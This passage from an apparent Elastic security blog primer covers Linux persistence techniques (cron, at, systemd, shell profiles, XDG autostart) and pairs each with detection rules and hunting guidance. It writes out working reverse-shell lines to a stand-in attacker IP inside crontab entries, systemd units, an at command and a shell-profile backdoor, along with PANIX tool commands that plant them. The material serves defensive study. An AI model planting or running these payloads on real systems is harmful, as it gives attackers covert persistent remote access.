rules, this is a great opportunity to test them and fill in any gaps.\n\nTo install, enable, and update our pre-built rules, follow these steps:\n\n1. Navigate to Kibana → Security → Rules → Detection rules (SIEM).\n2. You will find your installed and potential new and/or updated pre-built rules here.\n3. Use the \"Add Elastic rules\" button to add the latest Elastic pre-built rules.\n4. Use the \"Rule Updates\" tab to update existing rules.\n\nNow, we are ready to get started. \n\n## T1053 - scheduled task/job\n\nAutomating routine tasks is common in Unix-like operating systems for system maintenance. Some common utilities used for task scheduling are [cron](https://www.man7.org/linux/man-pages/man8/cron.8.html) and [at](https://man7.org/linux/man-pages/man1/at.1p.html). MITRE details information related to this technique under the identifier [T1053](https://attack.mitre.org/techniques/T1053/). \n\n### T1053.003 - scheduled task/job: Cron\n\n[Cron](https://www.man7.org/linux/man-pages/man8/cron.8.html) is a utility for scheduling recurring tasks to run at specific times or intervals. It is available by default on most Linux distributions. It is a [daemon](https://man7.org/linux/man-pages/man7/daemon.7.html) (that is, a background process that typically performs tasks without requiring user interaction) that reads cron files from a default set of locations. These files contain commands to run periodically and/or at a scheduled time.\n\nThe scheduled task is called a cron job and can be executed with both user and root permissions, depending on the configuration. Due to its versatility, cron is an easy and stable candidate for Linux persistence, even without escalating to root privileges upon initial access. \n\nThere are user-specific and system-wide cron jobs. The user-specific cron jobs commonly reside in:\n\n* `/var/spool/cron/`\n* `/var/spool/cron/crontabs/`\n\nThe system-wide cron jobs are located in the following:\n\n* `/etc/crontab`\n* `/etc/cron.d/`\n* `/etc/cron.daily/`\n* `/etc/cron.hourly/`\n* `/etc/cron.monthly/`\n* `/etc/cron.weekly/`\n\nThe cron file syntax slightly differs based on the location in which the cron file is created. For the cron files in the `/etc/` directory, the user who will execute the job must be specified.\n\n```\n* * * * * root /bin/bash -c '/srv/backup_tool.sh'\n```\n\nConversely, the user who created the cron files in the `/var/spool/cron/crontabs/` directory will execute the cron files.\n\n```\n* * * * * /bin/bash -c '/srv/backup_tool.sh'\n```\n\nThe asterisks are used to create the schedule. They represent (in order) minutes, hours, days (of the month), months, and days (of the week). Setting “`* * * * *`” means the cron job is executed every minute while setting “`* * 1 12 *`”` `means the cron job is executed every minute on the first day of December. Information on cron scheduling is available at [Crontab Guru](https://crontab.guru/).\n\nAttackers can exploit these jobs to run scripts or binaries that establish reverse connections or add reverse shell commands.\n\n```\n* * * * * root /bin/bash -c 'sh -i \u003e\u0026 /dev/tcp/192.168.1.1/1337 0\u003e\u00261'\n```\n\nMITRE specifies more information and real-world examples related to this technique in [T1053.003](https://attack.mitre.org/techniques/T1053/003/).\n\n#### Persistence through T1053.003 - cron\n\nYou can manually create a system-wide cron file in any of the `/etc/` directories or use the `crontab -e` command to create a user-specific cron file. To more easily illustrate all of the persistence mechanisms presented in these articles, we will use PANIX. Depending on the privileges when running it, you can establish persistence like so:\n\n```\nsudo ./panix.sh --cron --default --ip 192.168.1.1 --port 2001\n[+] Cron job persistence established.\n```\n\nThe default setting for the root user will create a cron file at `/etc/cron.d/freedesktop_timesync1` that calls out to the attacker system every minute. When looking at the events, we can see the following:\n\n![Events generated as a result of cron persistence establishment](/assets/images/primer-on-persistence-mechanisms/image11.png \"Events generated as a result of cron persistence establishment\")\n\nWhen PANIX was executed, the cron job was created, `/usr/sbin/cron` read the contents of the cron file and executed it, after which a network connection was established. Analyzing this chain of events, we can identify several detection capabilities for this and other proof-of-concepts.\n\nElastic SIEM includes over 1,000 prebuilt rules and more than 200 specifically dedicated to Linux. These rules run on the Elastic cluster and are designed to detect threat techniques that are available in our public [detection rules repository](https://github.com/elastic/detection-rules/tree/main). Our prevention capabilities include behavioral endpoint rules and memory/file signatures, which are utilized by Elastic Defend and can be found in our public [protection artifacts repository](https://github.com/elastic/protections-artifacts). \n\n| Category | Coverage                                           |\n|----------|----------------------------------------------------|\n| File     | [Cron Job Created or Modified](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_cron_job_creation.toml)                       |\n|          | [Suspicious File Creation in /etc for Persistence](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_etc_file_creation.toml)   |\n|          | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml)        |\n| Process  | [Hidden Payload Executed via Scheduled Job](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_hidden_payload_executed_via_scheduled_job.toml)          |\n|          | [Scheduled Job Executing Binary in Unusual Location](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_scheduled_job_executing_binary_in_unusual_location.toml) |\n|          | [Scheduled Task Unusual Command Execution](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_scheduled_task_unusual_command_execution.toml)           |\n\nThe file category has three different rules, the first two focusing on creation/modification using Elastic Defend, while the third focuses on modification through [File Integrity Monitoring (FIM)](https://www.elastic.co/docs/current/integrations/fim). FIM can be set up using [Auditbeat](https://www.elastic.co/guide/en/beats/auditbeat/current/auditbeat-module-file_integrity.html) or via the Fleet integration. To correctly set up FIM, it is important to specify full paths to the files that FIM should monitor, as it does _not_ allow for wildcards. Therefore, Potential Persistence via File Modification is a rule that requires manual setup and tailoring to your specific needs, as it will require individual entries depending on the persistence technique you are trying to detect.\n\n### T1053.002 - scheduled task/job: at\n\n[At](https://man7.org/linux/man-pages/man1/at.1p.html) is a utility for scheduling one-time tasks to run at a specified time in the future on Linux systems. Unlike cron, which handles recurring tasks, At is designed for single executions. The At daemon (`atd`) manages and executes these scheduled tasks at the specified time.\n\nAn At job is defined by specifying the exact time it should run. Depending on the configuration, users can schedule At jobs with either user or root permissions. This makes At a straightforward option for scheduling tasks without the need for persistent or repeated execution, but less useful for attackers. Additionally, At is not present on most Linux distributions by-default, which makes leveraging it even less trivial. However, it is still used for persistence, so we should not neglect the technique.\n\nAt jobs are stored in `/var/spool/cron/atjobs/`. Besides the At job, At also creates a spool file in the `/var/spool/cron/atspool/` directory. These job files contain the details of the scheduled tasks, including the commands to be executed and the scheduled times. \n\nTo schedule a task using At, you simply provide the command to run and the time for execution. The syntax is straightforward:\n\n```\necho \"/bin/bash -c 'sh -i \u003e\u0026 /dev/tcp/192.168.1.1/1337 0\u003e\u00261'\" | at now + 1 minute\n```\n\nThe above example schedules a task to run one minute from the current time. The time format can be flexible, such as `at 5 PM tomorrow` or `at now + 2 hours`. At job details can be listed using the `atq` command, and specific jobs can be removed using `atrm`.\n\nAt is useful for one-time task scheduling and complements cron for users needing recurring and single-instance task scheduling solutions. MITRE specifies more information and real-world examples related to this technique in [T1053.002](https://attack.mitre.org/techniques/T1053/002/).\n\n#### Persistence through T1053.002 - At\n\nYou can leverage the above command structure or use PANIX to set up an At job. Ensure At is installed on your system and the time settings are correct, as this might interfere with the execution. \n\n```\n./panix.sh --at --default --ip 192.168.1.1 --port 2002 --time 14:49\njob 15 at Tue Jun 11 14:49:00 2024\n[+] At job persistence established.\n```\n\nBy default, depending on the privileges used to run the program, a reverse connection will be established at the time interval the user specified. Looking at the events in Discover:\n\n![Events generated as a result of At persistence establishment](/assets/images/primer-on-persistence-mechanisms/image2.png \"Events generated as a result of At persistence establishment\")\n\nWe see the execution of PANIX, which is creating the At job. Next, At(d) creates two files, an At job and an At spool. At the correct time interval, the At job is executed, after which the reverse connection to the attack IP is established. Looking at these events, we have fewer behavioral coverage opportunities than we have for cron, as behaviorally, it is just `/bin/sh` executing a shell command. However, we can still identify the following artifacts:\n\n| Category | Coverage                                    |\n|----------|---------------------------------------------|\n| File     | [At Job Created or Modified](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_at_job_creation.toml)                  |\n|          | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml) |\n\n### T1053 - scheduled task/job: honorable mentions\n\nSeveral other honorable mentions for establishing persistence through scheduled tasks/jobs include [Anacron](https://www.man7.org/linux/man-pages/man8/anacron.8.html), [Fcron](https://man.archlinux.org/man/fcron.8.en), [Task Spooler](https://manpages.ubuntu.com/manpages/xenial/man1/tsp.1.html), and [Batch](https://man7.org/linux/man-pages/man1/batch.1p.html). While these tools are less commonly leveraged by malware due to their non-default installation and limited versatility compared to cron and other mechanisms, they are still worth noting. We include behavioral detection rules for some of these in our persistence rule set. For example, Batch jobs are saved in the same location as At jobs and are covered by our \"[At Job Created or Modified](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_at_job_creation.toml)\" rule. Similarly, Anacron jobs are covered through our \"[Cron Job Created or Modified](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_cron_job_creation.toml)\" rule, as Anacron integrates with the default Cron persistence detection setup.\n\n### Hunting for T1053 - scheduled task/job \n\nBesides relying on Elastic’s pre-built [detection](https://github.com/elastic/detection-rules) and [endpoint rules](https://github.com/elastic/protections-artifacts), a defender will greatly benefit from manual threat hunting. As part of Elastic’s 8.14 release, the general availability of the [Elasticsearch Query Language (ES|QL) language](https://www.elastic.co/guide/en/elasticsearch/reference/current/esql.html) was introduced. ES|QL provides a powerful way to filter, transform, and analyze data stored in Elasticsearch. For this use case, we will leverage ES|QL to hunt through all the data in an Elasticsearch stack for traces of cron, At, Anacron, Fcron, Task Spooler,` `and Batch persistence. \n\nWe can leverage the following ES|QL query that can be tailored to your specific environment:\n\nThis query returns 76 hits that could be investigated. Some are related to PANIX, others to real malware detonations, and some are false positives. \n\n![Results of the ES|QL hunt for scheduled task persistence establishment](/assets/images/primer-on-persistence-mechanisms/image5.png \"Results of the ES|QL hunt for scheduled task persistence establishment\")\n\nDealing with false positives is crucial, as system administrators and other authorized personnel commonly use these tools. Differentiating between legitimate and malicious use is essential for maintaining an effective security posture. Accurately identifying the intent behind using these tools helps minimize disruptions caused by false alarms while ensuring that potential threats are addressed promptly.\n\nPrograms similar to cron also have an execution history, as all of the scripts it executes will have cron as its parent. This allows us to hunt for unusual process executions through ES|QL:\n\nThis example performs aggregation using a `distinct_count` of `host.id`. If an anomalous entry is observed, `host_count` can be removed, and additional fields such as `host.name` and `user.name` can be added to the by section. This can help find anomalous behavior on specific hosts rather than across the entire environment. This could also be an additional pivoting opportunity if suspicious processes are identified. \n\nIn this case, the query returns 37 results, most of which are true positives due to the nature of the testing stack in which this is executed. \n\n![Results of the ES|QL hunt for scheduled task execution persistence establishment](/assets/images/primer-on-persistence-mechanisms/image3.png \"Results of the ES|QL hunt for scheduled task execution persistence establishment\")\n\nIn your environment, this will likely return a massive amount of results. You may consider reducing/increasing the number of days that are being searched. Additionally, the total count of entries (cc) and host_count can be increased/decreased to make sense for your environment. Every network is unique; therefore, a false positive in one environment may not be a false positive for every environment. Additionally, the total count of entries (`cc`) and `host_count` can be increased/decreased to make sense for your environment. Every network is unique, and therefore a false-positive in one environment may not be a false-positive in another. Adding exclusions specific to your needs will allow for easier hunting.\n\nBesides ES|QL, we can also leverage Elastic’s [OSQuery Manager integration](https://www.elastic.co/docs/current/integrations/osquery_manager). OSQuery is an open-source, cross-platform tool that uses SQL queries to investigate and monitor the operating system's performance, configuration, and security by exposing system information as a relational database. It allows administrators and security professionals to easily query system data and create real-time monitoring and analytics solutions. Streaming telemetry represents activity over time, while OSQuery focuses on static on-disk presence. This opens the door for detecting low-and-slow/decoupled-style attacks and might catch otherwise missed activity through telemetry hunting. \n\nInformation on how to set up OSQuery can be found in the [Kibana docs](https://www.elastic.co/guide/en/kibana/current/osquery.html), and a blog post explaining OSQuery in depth can be found [here](https://www.elastic.co/blog/gain-upper-hand-over-adversaries-with-osquery-and-elastic). We can run the following live query to display all of the cron files present on a particular system:\n\nThe following results are returned. We can see the `/etc/cron.d/freedesktop_timesync1` with a `file_last_status_change_time` that is recent and differs from the rest of the cron files. This is the backdoor planted by PANIX. \n\n![Results of the OSQuery hunt for scheduled task persistence establishment](/assets/images/primer-on-persistence-mechanisms/image4.png \"Results of the OSQuery hunt for scheduled task persistence establishment\")\n\nIf we want to dig deeper, OSQuery also provides a module to read the commands from the crontab file by running the following query:\n\nThis shows us the command, the location of the cron job, and the corresponding schedule at which it runs. \n\n![Results of the OSQuery crontab hunt](/assets/images/primer-on-persistence-mechanisms/image1.png \"Results of the OSQuery crontab hunt\")\n\nAnalyzing the screenshot, we see two suspicious reverse shell entries, which could require additional manual investigation. \n\nAn overview of the hunts outlined above, with additional descriptions and references, can be found in our [detection rules repository](https://github.com/elastic/detection-rules), specifically in the [Linux hunting subdirectory](https://github.com/elastic/detection-rules/tree/main/hunting). We can hunt for uncommon scheduled task file creations or unusual process executions through scheduled task executables by leveraging ES|QL and OSQuery. The [Persistence via Cron](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_cron.toml) hunt contains several ES|QL and OSQuery queries to aid this process.\n\n## T1453 - create or modify system process (systemd)\n\n[Systemd](https://man7.org/linux/man-pages/man1/init.1.html) is a system and service manager for Linux, widely adopted as a replacement for the traditional [SysVinit](https://manpages.debian.org/testing/sysvinit-core/init.8.en.html) system. It is responsible for initializing the system, managing processes, and handling system resources. Systemd operates through a series of unit files defining how services should be started, stopped, and managed.\n\n[Unit files](https://manpages.debian.org/jessie/systemd/systemd.unit.5.en.html) have different types, each designed for specific purposes. The Service unit is the most common unit type for managing long-running processes (typically daemons). Additionally, the Timer unit manages time-based activation of other units, similar to cron jobs, but integrated into Systemd. \n\nThis section will discuss [T1453](https://attack.mitre.org/techniques/T1543/) for systemd services and generators, and [T1053](https://attack.mitre.org/techniques/T1053/) for systemd timers.\n\n### T1453.002 - create or modify system process: systemd services\n\nThe [services](https://www.digitalocean.com/community/tutorials/understanding-systemd-units-and-unit-files) managed by systemd are defined by unit files, and are located in default directories, depending on the operating system and whether the service is run system-wide or user-specific. The system-wide unit files are typically located in the following directories:\n\n* `/run/systemd/system/`\n* `/etc/systemd/system/`\n* `/etc/systemd/user/`\n* `/usr/local/lib/systemd/system/`\n* `/lib/systemd/system/`\n* `/usr/lib/systemd/system/`\n* `/usr/lib/systemd/user/`\n\nUser-specific unit files are typically located at:\n\n* `~/.config/systemd/user/`\n* `~/.local/share/systemd/user/`\n\nA basic service unit file consists of three main sections: `[Unit]`, `[Service]`, and `[Install]`, and has the `.service` extension. Here's an example of a simple unit file that could be leveraged for persistence:\n\n```\n[Unit]\nDescription=Reverse Shell\n\n[Service]\nExecStart=/bin/bash -c 'sh -i \u003e\u0026 /dev/tcp/192.168.1.1/1337 0\u003e\u00261'\n\n[Install]\nWantedBy=multi-user.target\n```\n\nThis unit file would attempt to establish a reverse shell connection every time the system boots, running with root privileges. More information and real-world examples related to systemd services are outlined by MITRE in [T1543.002](https://attack.mitre.org/techniques/T1543/002/).\n\nRelying solely on persistence upon reboot might be too restrictive. Timer unit files can be leveraged to overcome this limitation to ensure persistence on a predefined schedule.\n\n### T1053.006 - scheduled task/job: systemd timers\n\n[Timer units](https://wiki.archlinux.org/title/systemd/Timers) provide a versatile method to schedule tasks, similar to cron jobs but more integrated with the Systemd ecosystem. A timer unit specifies the schedule and is associated with a corresponding service unit that performs the task. Timer units can run tasks at specific intervals, on specific dates, or even based on system events.\n\nTimer unit files are typically located in the same directories as the service unit files and have a `.timer` extension. Coupling timers to services is done by leveraging the same unit file name but changing the extension. An example of a timer unit file that would activate our previously created service every hour can look like this:\n\n```\n[Unit]\nDescription=Obviously not malicious at all\n\n[Timer]\nOnBootSec=1min\nOnUnitActiveSec=1h\n\n[Install]\nWantedBy=timers.target\n```\n\nTimers are versatile and allow for different scheduling options. Some examples are `OnCalendar=Mon,Wed,Fri 17:00:00` to run a service every Monday, Wednesday, and Friday at 5:00 PM, and `OnCalendar=*-*-* 02:30:00` to run a service every day at 2:30 AM. More details and real world examples related to Systemd timers are presented by MITRE in [T1053.006](https://attack.mitre.org/techniques/T1053/006/).\n\n### T1453 - create or modify system process: systemd generators\n\n[Generators](https://manpages.debian.org/testing/systemd/systemd.generator.7.en.html) are small executables executed by systemd at bootup and during configuration reloads. Their main role is to convert non-native configuration and execution parameters into dynamically generated unit files, symlinks, or drop-ins, extending the unit file hierarchy for the service manager.\n\nSystem and user generators are loaded from the `system-generators`/ and `user-generators`/ directories, respectively, with those listed earlier overriding others of the same name. Generators produce output in three priority-based directories: `generator.early` (highest), `generator` (medium), and `generator.late` (lowest). Reloading daemons will re-run all generators and reload all units from disk.\n\nSystem-wide generators can be placed in the following directories:\n\n* `/run/systemd/system-generators/`\n* `/etc/systemd/system-generators/`\n* `/usr/local/lib/systemd/system-generators/`\n* `/lib/systemd/system-generators/`\n* `/usr/lib/systemd/system-generators/`\n\nUser-specific generators are placed in the following directories:\n\n* `/run/systemd/user-generators/`\n* `/etc/systemd/user-generators/`\n* `/usr/local/lib/systemd/user-generators/`\n* `/lib/systemd/user-generators/`\n* `/usr/lib/systemd/user-generators/`\n\n[Pepe Berba's research](https://pberba.github.io/security/2022/02/07/linux-threat-hunting-for-persistence-systemd-generators/) explores using systemd generators to establish persistence. One method involves using a generator to create a service file that triggers a backdoor on boot. Alternatively, the generator can execute the backdoor directly, which can cause delays if the network service is not yet started, alerting the user. Systemd generators can be binaries or shell scripts. For example, a payload could look like this:\n\n```\n#!/bin/sh\n# Create a systemd service unit file in the late directory\ncat \u003c\u003c-EOL \u003e \"/run/systemd/system/generator.service\"\n[Unit]\nDescription=Generator Service\n\n[Service]\nExecStart=/usr/lib/systemd/system-generators/makecon\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=multi-user.target\nEOL\n\nmkdir -p /run/systemd/system/multi-user.target.wants/\nln -s /run/systemd/system/generator.service /run/systemd/system/multi-user.target.wants/generator.service\n\n# Ensure the script exits successfully\nexit 0\n```\n\nWhich creates a new service (`generator.service`), which in turn executes `/usr/lib/systemd/system-generators/makecon` on boot. As this method creates a service (albeit via a generator), we will take a closer look at systemd service persistence. Let's examine how these work in practice.\n\n### Persistence through T1453/T1053 - systemd services, timers and generators\n\nYou can manually create the unit file in the appropriate directory, reload the daemon, enable and start the service, or use PANIX to do that for you. PANIX will create a service unit file in the specified directory, which in turn runs the custom command at a one-minute interval through a timer unit file. You can also use `--default` with` --ip`, `--port,` and `–-timer`.\n\n```\nsudo ./panix.sh --systemd --custom --path /etc/systemd/system/panix.service --command \"/usr/bin/bash -c 'bash -i \u003e\u0026 /dev/tcp/192.168.1.1/2003 0\u003e\u00261'\" --timer\nService file created successfully!\nCreated symlink /etc/systemd/system/default.target.wants/panix.service → /etc/systemd/system/panix.service.\nTimer file created successfully!\nCreated symlink /etc/systemd/system/timers.target.wants/panix.timer → /etc/systemd/system/panix.timer.\n[+] Persistence established. \n```\n\nWhen a service unit is enabled, systemd creates a symlink in the `default.target.wants/` directory (or another appropriate target directory). This tells systemd to start the `panix.service` automatically when the system reaches the `default.target`. Similarly, the symlink for the timer unit file tells systemd to activate the timer based on the schedule defined in the timer unit file.\n\nWe can analyze and find out what happened when looking at the documents in Kibana: \n\n![Events generated as a result of systemd service/timer persistence establishment](/assets/images/primer-on-persistence-mechanisms/image9.png \"Events generated as a result of systemd service/timer persistence establishment\")\n\nPANIX is executed, which creates the `panix.service` and `panix.timer` units in the corresponding directories. Then, `systemctl` is used to reload the daemons, after which the `panix.timer` is enabled and started, enabling systemd to run the `ExecStart` section of the service unit (which initiates the outbound network connection) every time the timer hits. To detect potential systemd persistence, we leverage the following behavioral rules:\n\n| Category | Coverage                                           |\n|----------|----------------------------------------------------|\n| File     | [Systemd Service Created](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_systemd_service_creation.toml)                            |\n|          | [Systemd Timer Created](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_systemd_scheduled_timer_created.toml)                              |\n|          | [Systemd Generator Created](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_systemd_generator_creation.toml)                          |\n|          | [Suspicious File Creation in /etc for Persistence](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_etc_file_creation.toml)   |\n| Process  | [Systemd Service Started by Unusual Parent Process](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_systemd_service_started.toml)  |\n|          | [Hidden Payload Executed via Scheduled Job](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_hidden_payload_executed_via_scheduled_job.toml)          |\n|          | [Scheduled Job Executing Binary in Unusual Location](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_scheduled_job_executing_binary_in_unusual_location.toml) |\n|          | [Scheduled Task Unusual Command Execution](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_scheduled_task_unusual_command_execution.toml)           |\n\n### Hunting for T1053/T1453 - systemd services, timers and generators\n\nWe can hunt for uncommon `service`/`timer`/`generator` file creations in our environment through systemd by leveraging ES|QL and OSQuery. The [Persistence via Systemd (Timers)](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_systemd_timers.toml) file contains several ES|QL and OSQuery queries that can help hunt for these types of persistence.\n\n## T1546.004 - event triggered execution: Unix shell configuration modification\n\n[Unix shell configuration files](https://effective-shell.com/part-5-building-your-toolkit/configuring-the-shell/) are scripts that run throughout a user session based on events (e.g., log in/out, or open/close a shell session). These files are used to customize the shell environment, including setting environment variables, aliases, and other session-specific settings. As these files are executed via a shell, they can easily be leveraged by attackers to establish persistence on a system by injecting backdoors into these scripts. \n\nDifferent shells have their own configuration files. Similarly to cron and systemd, this persistence mechanism can be established with both user and root privileges. Depending on the shell, system-wide shell configuration files are located in the following locations and require root permissions to be changed:\n\n* `/etc/profile`\n* `/etc/profile.d/`\n* `/etc/bash.bashrc`\n* `/etc/bash.bash_logout`\n\nUser-specific shell configuration files are triggered through actions performed by and executed in the user's context. Depending on the shell, these typically include:\n\n* `~/.profile`\n* `~/.bash_profile`\n* `~/.bash_login`\n* `~/.bash_logout`\n* `~/.bashrc`\n\nOnce modified, these scripts ensure malicious commands are executed for every user login or logout. These scripts are executed in a [specific order](https://www.thegeekstuff.com/2008/10/execution-sequence-for-bash_profile-bashrc-bash_login-profile-and-bash_logout/). When a user logs in via SSH, the order of execution for the login shells is:\n\n1. `/etc/profile`\n2. `~/.bash_profile` (if it exists, otherwise)\n3. `~/.bash_login` (if it exists, otherwise)\n4. `~/.profile` (if it exists)\n\nFor non-login interactive shell initialization, `~/.bashrc` is executed. Typically, to ensure this configuration file is also executed on login, `~/.bashrc` is sourced within `~/.bash_profile`, `~/.bash_login` or `~/.profile`. Additionally, a backdoor can be added to the `~/.bash_logout` configuration file for persistence upon shell termination. \n\nWhen planting a backdoor in one of these files, it is important not to make mistakes in the execution chain, meaning that it is both important to pick the correct configuration file and to pick a fitting payload. A typical reverse shell connection will make the terminal freeze while sending the reverse shell connection to the background will make it malfunction. A potential payload could look like this:\n\n```\n(nohup bash -i \u003e /dev/tcp/192.168.1.1/1337 0\u003c\u00261 2\u003e\u00261 \u0026)\n```\n\nThis command uses “nohup” (no hang up) to run an interactive bash reverse shell as a background process, ensuring it continues running even after the initiating user logs out. The entire command is then executed in the background using `\u0026` and wrapped in parentheses to create a subshell, preventing any interference with the parent shell’s operations.\n\nBe vigilant for other types of backdoors, such as credential stealers that create fake “`[sudo] password for…`” prompts when running sudo or the execution of malicious binaries. MITRE specifies more information and real-world examples related to this technique in [T1546.004](https://attack.mitre.org/techniques/T1546/004/).\n\n### Persistence through T1546.004 - shell profile modification\n\nYou can add a bash payload to shell configuration files either manually or using PANIX. When PANIX runs with user privileges, it establishes persistence by modifying `~/.bash_profile`. With root privileges, it modifies the `/etc/profile` file to achieve system-wide persistence.\n\n```\nsudo ./panix.sh --shell-profile --default --ip 192.168.1.1 --port 2004\n```\n\nTo trigger it, either log in as root via the shell with `su --login root` or login via SSH. The shell profile will be parsed and executed in order, resulting in the following chain of execution:\n\n![Events generated as a result of shell profile modification persistence establishment](/assets/images/primer-on-persistence-mechanisms/image10.png \"Events generated as a result of shell profile modification persistence establishment\")\n\nPANIX plants the backdoor in `/etc/profile`, next `su --login root` is executed to trigger the payload, the `UID`/`GID` changes to root, and a network connection is initiated through the injected backdoor. A similar process occurs when logging in via SSH. We can detect several steps of the attack chain. \n\nDetection and endpoint rules that cover shell profile modification persistence_\n\n| Category | Coverage                                                     |\n|----------|--------------------------------------------------------------|\n| File     | [Shell Configuration Creation or Modification](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_shell_configuration_modification.toml)                 |\n|          | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml)                  |\n| Process  | [Binary Execution from Unusual Location through Shell Profile](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_binary_execution_from_unusual_location_through_shell_profile.toml) |\n| Network  | [Network Connection through Shell Profile](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_network_connection_through_shell_profile.toml)                     |\n\n### Hunting for T1546.004 - shell configuration modification\n\nWe can hunt for shell profile file creations/modification, as well as SSHD child processes, by leveraging ES|QL and OSQuery. The [Shell Modification Persistence](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_shell_modification_persistence.toml) hunting rule contains several of these hunting queries.\n\n## T1547.013 - boot or logon autostart execution: XDG autostart entries\n\nCross-Desktop Group (XDG) is a set of[ standards for Unix desktop environments](https://specifications.freedesktop.org/autostart-spec/autostart-spec-latest.html) that describe how applications should be started automatically when a user logs in. The XDG Autostart specification is particularly interesting, as it defines a way to automatically launch applications based on desktop entry files, which are plain text files with the `.desktop` extension.\n\nThe `.desktop` files are typically used to configure how applications appear in menus and how they are launched. By leveraging XDG Autostart, attackers can configure malicious applications to run automatically whenever users log into their desktop environment.\n\nThe location where these files can be placed varies based on whether the persistence is being established for all users (system-wide) or a specific user. It also depends on the desktop environment used; for example, KDE has other configuration locations than Gnome. Default system-wide autostart files are located in directories that require root permissions to modify, such as:\n\n* `/etc/xdg/autostart/`\n* `/usr/share/autostart/`\n\nDefault user-specific autostart files, other than the root user-specific autostart file, only require user-level permissions. These are typically located in:\n\n* `~/.config/autostart/`\n* `~/.local/share/autostart/`\n* `~/.config/autostart-scripts/ (not part of XDG standard, but used by KDE)`\n* `/root/.config/autostart/*`\n* `/root/.local/share/autostart/`\n* `/root/.config/autostart-scripts/`\n\nAn example of a `.desktop` file that executes a binary whenever a user logs in looks like this:\n\n```\n[Desktop Entry]\nType=Application\nExec=/path/to/malicious/binary\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName=Updater\n```\n\nVolexity recently published research on [DISGOMOJI](https://www.volexity.com/blog/2024/06/13/disgomoji-malware-used-to-target-indian-government/) malware, which was found to establish persistence by dropping a `.desktop` file in the `~/.config/autostart/` directory, which would execute a malicious backdoor planted on the system. As it can be established with both user/root privileges, it is an interesting candidate for automated persistence implementations. Additionally, more information and real-world examples related to this technique are specified by MITRE in [T1547.013](https://attack.mitre.org/techniques/T1547/013/).\n\n### Persistence through T1547.013 - Cross-Desktop Group (XDG)\n\nYou can determine coverage and dynamically analyze this technique manually or through PANIX. When analyzing this technique, make sure XDG is available on your testing system, as it is designed to be used on systems with a GUI (XDG can also be used without a GUI). When PANIX runs with user privileges, it establishes persistence by modifying `~/.config/autostart/user-dirs.desktop` to execute `~/.config/autostart/.user-dirs` and achieve user-specific persistence. With root privileges, it modifies `/etc/xdg/autostart/pkc12-register.desktop` to execute `/etc/xdg/pkc12-register` and achieve system-wide persistence.\n\n```\nsudo ./panix.sh --xdg --default --ip 192.168.1.1 --port 2005\n[+] XDG persistence established.\n```\n\nAfter rebooting the system and collecting the logs, the following events will be present for a GNOME-based system.\n\n![Events generated as a result of XDG persistence establishment](/assets/images/primer-on-persistence-mechanisms/image7.png \"Events generated as a result of XDG persistence establishment\")\n\nWe can see PANIX creating the `/etc/xdg/autostart` directory and the `pkc12-register/pkc12-register.desktop` files. It grants execution privileges to the backdoor script, after which persistence is established. When the user logs in, the `.desktop` files are parsed, and `/usr/libexec/gnome-session-binary` executes its contents, which in turn initiates the reverse shell connection. Here, again, we can detect several parts of the attack chain. \n\n| Category | Coverage                                                          |\n|----------|-------------------------------------------------------------------|\n| File     | [Persistence via KDE AutoStart Script or Desktop File Modification](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_kde_autostart_modification.toml) |\n|          | [Potential Persistence via File Modification](https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml)                       |\n| Network  | [Network Connections Initiated Through XDG Autostart Entry](https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_xdg_autostart_netcon.toml)         |\n\nAgain, the file category has two different rules: the former focuses on creation/modification using Elastic Defend, while the latter focuses on modification through FIM.\n\n### Hunting for T1547.013 - XDG autostart entries\n\nHunting for persistence through XDG involves XDG `.desktop` file creations in known locations and unusual child processes spawned from a session-manager parent through ES|QL and OSQuery. The [XDG Persistence](https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_xdg_autostart_modifications.toml) hunting rule contains several queries to hunt for XDG persistence.\n\n## T1548.001 - abuse elevation control mechanism: setuid and setgid\n\n[Set Owner User ID (SUID)](https://man7.org/linux/man-pages/man2/setuid.2.html) and [Set Group ID (SGID)](https://man7.org/linux/man-pages/man2/setgid.2.html) are Unix file permissions allowing users to run executables with the executable’s owner or group permissions, respectively. When the SUID bit is set on an executable owned by the root user, any user running the executable gains root privileges. Similarly, when the SGID bit is set on an executable, it runs with the permissions of the group that owns the file. \n\nTypical targets for SUID and SGID backdoors include common system binaries like `find`, `vim`, or `bash`, frequently available and widely used. [GTFOBins](https://gtfobins.github.io/#+suid) provides a list of common Unix binaries that can be exploited to obtain a root shell or unauthorized file reads. System administrators must be cautious when managing SUID and SGID binaries, as improperly configured permissions can lead to significant security vulnerabilities. \n\nTo exploit this, either 